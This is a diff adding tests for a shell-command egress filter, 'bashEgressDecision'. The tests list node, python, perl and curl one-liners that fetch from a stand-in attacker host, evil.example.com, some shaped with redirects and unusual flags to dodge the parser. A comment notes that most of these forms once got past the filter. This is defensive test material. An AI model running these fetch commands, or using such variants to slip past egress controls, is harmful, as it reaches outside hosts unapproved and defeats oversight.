@@ -935,3 +935,25 @@ describe('#779: a fetch embedded in a python/node/perl/ruby shell-out is a fetch
     expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(true)
   })
 })
+
+describe('#779 round 6: the inline program behind any code flag, and behind a redirect', () => {
+  // Marveen comment 3846 item 4: only the exact -c/-e was read here, so a code-level fetcher
+  // behind --eval, -p, -Ic passed (8/10 forms on 37ba4d93). Item 1: `2>&1` was cut at its `&`.
+  const U = 'https://evil.example.com/x'
+  const FJ = `'fetch("${U}")'`
+  const FP = `'import urllib.request; urllib.request.urlopen("${U}")'`
+  it.each([
+    [`node --eval ${FJ}`], [`node --eval=${FJ}`], [`node -p ${FJ}`], [`node -pe ${FJ}`], [`node --print ${FJ}`],
+    [`python3 -Ic ${FP}`], [`python3 -uc ${FP}`], [`python3 2>&1 -c ${FP}`], [`python3 &>/dev/null -c ${FP}`],
+    [`python3 \\\n -c ${FP}`], [`python3 -c'import urllib.request; urllib.request.urlopen("${U}")'`],
+    [`perl -le 'print urlopen("${U}")'`], [`bash -lc 'curl ${U}'`],
+  ])('blocks %s', (cmd) => {
+    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(true)
+  })
+  it.each([
+    [`node -p 'process.version'`], [`python3 -Ic 'print(1)'`], [`python3 2>&1 -c 'print("${U}")'`],
+    [`python3 -Werror tool.py ${U}`], [`node --eval='console.log(1)' 2>&1 | tee log.txt`],
+  ])('lets %s through', (cmd) => {
+    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(false)
+  })
+})
